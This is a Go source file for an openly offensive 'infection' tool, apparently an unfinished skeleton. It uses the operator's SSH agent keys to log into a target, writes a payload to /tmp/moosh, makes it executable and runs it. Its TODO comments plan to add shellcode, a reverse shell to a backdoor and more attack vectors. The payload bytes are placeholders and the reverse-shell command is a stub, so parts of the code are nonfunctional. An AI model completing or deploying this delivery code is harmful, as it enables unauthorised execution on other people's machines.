package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"

	"github.com/pkg/errors"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

// TODO: add shellcode of the exploit - maybe generate it?
var Moosh64 = []byte{0xde, 0xad, 0xbe, 0xef}
var Moosh86 = []byte{}

func sshExecute(addr string, b []byte) error {
	auth := []ssh.AuthMethod{}
	if sock := os.Getenv("SSH_AUTH_SOCK"); sock != "" {
		a, err := net.Dial("unix", sock)
		if err != nil {
			return errors.Wrap(err, "failed to connect to SSH agent")
		}
		auth = append(auth, ssh.PublicKeysCallback(agent.NewClient(a).Signers))
	}

	cl, err := ssh.Dial("tcp", addr, &ssh.ClientConfig{
		Auth: auth,
	})
	if err != nil {
		return errors.Wrap(err, "failed to connect to host via SSH")
	}

	s, err := cl.NewSession()
	if err != nil {
		return errors.Wrap(err, "failed to create new SSH session")
	}

	if out, err := s.CombinedOutput(fmt.Sprintf("echo %s > /tmp/moosh && chmod +x /tmp/moosh && /tmp/moosh", string(b))); err != nil {
		return errors.Wrapf(err, "failed to run exploit, with output: %s", out)
	}
	return nil
}

func main() {
	addr := flag.String("addr", "", "The lucky guy")
	arch := flag.String("arch", "x64", "Bitness of the system, (x64 or x86)")
	ssh := flag.Bool("ssh", false, "Use SSH for the infection")
	flag.Parse()

	if *arch != "x86" && *arch != "x64" || *addr == "" {
		flag.Usage()
		os.Exit(1)
	}

	b := Moosh64
	if *arch == "x86" {
		b = Moosh86
	}

	var execute func(addr string, b []byte) error
	switch {
	case *ssh:
		execute = sshExecute
		// TODO: add more attack vectors
	default:
		// TODO: attempt to connect to the backdoor
		// and return the reverse shell
		sh := exec.Command("#open reverse shell")
		sh.Stderr = os.Stderr
		sh.Stdout = os.Stdout
		sh.Stdin = os.Stdin
		if err := sh.Start(); err != nil {
			log.Fatalf("Failed to open reverse shell: %s", err)
		}
		os.Exit(0)
	}

	if err := execute(*addr, b); err != nil {
		log.Fatalf("Failed to pwn %s: %s", *addr, err)
	}
}
